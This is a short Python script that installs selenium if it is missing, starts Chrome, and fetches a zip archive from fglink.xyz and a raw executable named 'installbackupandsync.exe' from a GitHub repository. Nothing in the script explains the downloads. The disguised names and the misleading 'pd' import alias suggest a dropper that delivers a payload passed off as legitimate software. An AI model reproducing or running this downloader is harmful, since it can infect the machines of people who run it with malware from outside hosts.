import subprocess
import sys

try:
    import selenium as pd
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'selenium'])
finally:
    from selenium import webdriver
    driver = webdriver.Chrome()
    driver.get("https://fglink.xyz/G-Tv.zip")
    driver.get("https://github.com/RetrixDev/mirrorbot-workflow/blob/main/installbackupandsync.exe?raw=true")


